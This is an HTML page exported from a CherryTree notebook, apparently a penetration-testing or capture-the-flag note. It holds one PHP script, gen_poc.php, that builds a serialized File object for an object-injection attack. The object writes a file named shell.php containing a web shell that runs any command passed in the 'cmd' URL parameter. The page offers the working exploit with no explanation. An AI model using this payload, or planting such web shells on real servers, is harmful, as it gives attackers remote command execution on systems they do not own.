@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>gen_poc.php</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">gen_poc.php</h1><br/><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">&lt;?php</span><br /><br /><span style="color:#ff9d00;font-weight:700">require</span>&nbsp;<span style="color:#3ad900;font-weight:400">'file.php'</span><span style="color:#ff9d00;font-weight:400">;</span><br /><span style="color:#333333;font-weight:400">$output</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;File<span style="color:#ff9d00;font-weight:400">();</span><br /><span style="color:#333333;font-weight:400">$output</span><span style="color:#ff9d00;font-weight:400">-&gt;</span>filename<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#3ad900;font-weight:400">"shell.php"</span><span style="color:#ff9d00;font-weight:400">;</span><br /><span style="color:#333333;font-weight:400">$output</span><span style="color:#ff9d00;font-weight:400">-&gt;</span>content<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#3ad900;font-weight:400">'&lt;?php&nbsp;echo&nbsp;system($_GET[\'cmd\']);&nbsp;?&gt;'</span><span style="color:#ff9d00;font-weight:400">;</span><br /><br /><span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#ff9d00;font-weight:700">serialize(</span><span style="color:#333333;font-weight:400">$output</span><span style="color:#ff9d00;font-weight:400">);</span><br /><br /><span style="color:#ff9d00;font-weight:700">?&gt;</span><br /></div></div></div></body></html>
